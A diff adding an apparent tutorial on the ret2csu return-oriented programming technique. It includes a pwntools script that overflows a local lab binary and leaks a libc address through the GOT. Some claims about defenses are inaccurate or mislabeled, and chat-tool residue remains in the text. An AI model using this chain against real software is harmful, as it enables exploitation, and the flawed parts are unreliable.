@@ -1,1 +1,121 @@
+Stack Migration via ret2csu is an advanced 64-bit (x86_64) Return-Oriented Programming (ROP) technique.
+In 64-bit Linux applications, arguments are passed to functions via CPU registers (RDI, RSI, RDX, RCX, R8, R9) rather than the stack. When constructing a ROP chain to call a function like write(int fd, const void *buf, size_t count), you need gadgets to control the first three registers (RDI, RSI, RDX).
+While finding pop rdi; ret or pop rsi; ret gadgets is usually easy, finding a pop rdx; ret gadget is notoriously rare in stripped, small binaries. The ret2csu technique solves this by leveraging a universal set of gadgets found inside __libc_csu_init, a function built into almost every compiled GNU/Linux C binary by default to handle initializers.
+
+1. The Universal __libc_csu_init Gadget Anatomy
+
+If you inspect __libc_csu_init in a debugger or disassembler like Ghidra, you will consistently find two crucial blocks of code sitting at the end of the function:
+
+Gadget 1 (The Register Loader / Setup)
+
+This block pops a series of values off the stack into six registers, concluding with a ret.
+assembly
+pop     rbx
+pop     rbp
+pop     r12
+pop     r13
+pop     r14
+pop     r15
+ret
+Use code with caution.
+
+Gadget 2 (The Executor / Moving to Arguments)
+
+This block takes the values loaded into R13, R14, and R15 and moves them into the official 64-bit argument registers (RDX, RSI, EDI). It then executes a call to whatever pointer is inside R12 + RBX*8.
+assembly
+mov     rdx, r15        ; Third argument (Count)
+mov     rsi, r14        ; Second argument (*buf)
+mov     edi, r13d       ; First argument (fd) -> Note: sets 32-bit EDI
+call    qword ptr [r12+rbx*8]
+add     rbx, 1
+cmp     rbp, rbx
+jnz     <Gadget 2 start> ; Loop control check
+Use code with caution.
+
+2. The Exploit Mechanics
+
+To successfully use these gadgets in tandem without crashing the program:
+1. Jump to Gadget 1 to safely set up your registers.
+2. Structure the stack values so that:
+	• RBX = 0 (Prevents mathematical offsets during the subsequent array call).
+	• RBP = 1 (Satisfies the cmp rbp, rbx check later, avoiding an infinite loop).
+	• R12 = Address of a pointer to your target function (e.g., a Global Offset Table entry).
+	• R13, R14, R15 = Arguments 1, 2, 3 respectively.
+3. Return straight into Gadget 2. This fills RDI/RSI/RDX, calls your function via R12, increments RBX, verifies it equals RBP (1 == 1), skips the jump instruction, and exits cleanly.
+
+3. The Python Exploit Script (csu_exploit.py)
+
+This script executes a ret2csu chain to control arguments and call a function, then safely moves execution back to the application workflow.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Load the binary and establish local environment context
+elf = ELF('./csu_vuln')
+io = process('./csu_vuln')
+
+# Find csu gadget offsets statically via pwntools ROP engine
+# You can also find these by looking at objdump -d ./csu_vuln
+csu = rop.ROP(elf)
+
+# Base addresses of our standard CSU gadgets
+# Gadget 1: contains the sequence of pops (rbx, rbp, r12, r13, r14, r15, ret)
+gadget_1 = 0x4011ba  
+# Gadget 2: contains the register moves and the call instruction
+gadget_2 = 0x4011a0  
+
+# Identify targets from the Global Offset Table (GOT)
+# We want to call write() to leak memory info or read() to load shellcode
+write_got = elf.got['write']
+main_address = elf.symbols['main']
+
+# Payload offset to overwrite return pointer
+offset = 72
+
+# ========================================================
+# BUILDING THE RET2CSU CHAIN
+# ========================================================
+rop_chain = p64(gadget_1)    # Jump to the POP sequence first
+rop_chain += p64(0)          # rbx must be 0
+rop_chain += p64(1)          # rbp must be 1 to pass the loop comparison test
+rop_chain += p64(write_got)  # r12 -> pointer to the function we want to call
+rop_chain += p64(1)          # r13 -> becomes EDI (Arg 1: stdout file descriptor)
+rop_chain += p64(write_got)  # r14 -> becomes RSI (Arg 2: buffer pointing to write GOT)
+rop_chain += p64(8)          # r15 -> becomes RDX (Arg 3: length of 8 bytes to leak)
+
+rop_chain += p64(gadget_2)   # Jump to the MOV sequence to populate registers and call
+
+# After Gadget 2 runs its checks, it falls through into 7 more POPs before hitting ret.
+# We must send dummy padding bytes to account for this before chaining our next action.
+rop_chain += b"A" * 8        # Dummy alignment pad
+rop_chain += p64(0)          # rbx dummy data
+rop_chain += p64(0)          # rbp dummy data
+rop_chain += p64(0)          # r12 dummy data
+rop_chain += p64(0)          # r13 dummy data
+rop_chain += p64(0)          # r14 dummy data
+rop_chain += p64(0)          # r15 dummy data
+
+# Target destination to safely resume clean execution flow after the leak
+rop_chain += p64(main_address) 
+
+# Combine buffer padding with the ROP chain
+payload = b"B" * offset + rop_chain
+
+io.recvuntil(b"Enter input: ")
+log.info("Deploying universal __libc_csu_init ROP chain...")
+io.sendline(payload)
+
+# Receive the 8 bytes leaked off the GOT via our newly controlled RDX register
+leaked_bytes = io.recv(8)
+leaked_write = u64(leaked_bytes)
+log.success(f"Leaked libc write() runtime location: {hex(leaked_write)}")
+
+io.interactive()
+Use code with caution.
+
+4. Bypassing Ret2CSU via Modern Defenses
+
+Because ret2csu depends entirely on predictable function patterns compiled directly into statically aligned code sections, security researchers and compiler groups engineered changes:
+• Control-Flow Enforcement Technology (CET): Modern Intel/AMD CPUs support hardware-enforced IBT (Indirect Branch Tracking). When IBT is active, the CPU enforces that any indirect jump or call (like the call [r12+rbx*8] instruction in ret2csu) must land exclusively on a valid landing pad instruction (ENDBR64). Landing anywhere else triggers an instant architectural crash, neutralizing the gadget sequence.
+• Modern GCC Optimizations (-O2 / -O3): Modern compilers have restructured or entirely omitted the legacy layout of __libc_csu_init in favor of more decentralized runtime initialization calls, stripping out the predictable block of contiguous registers pops and moves entirely.
 
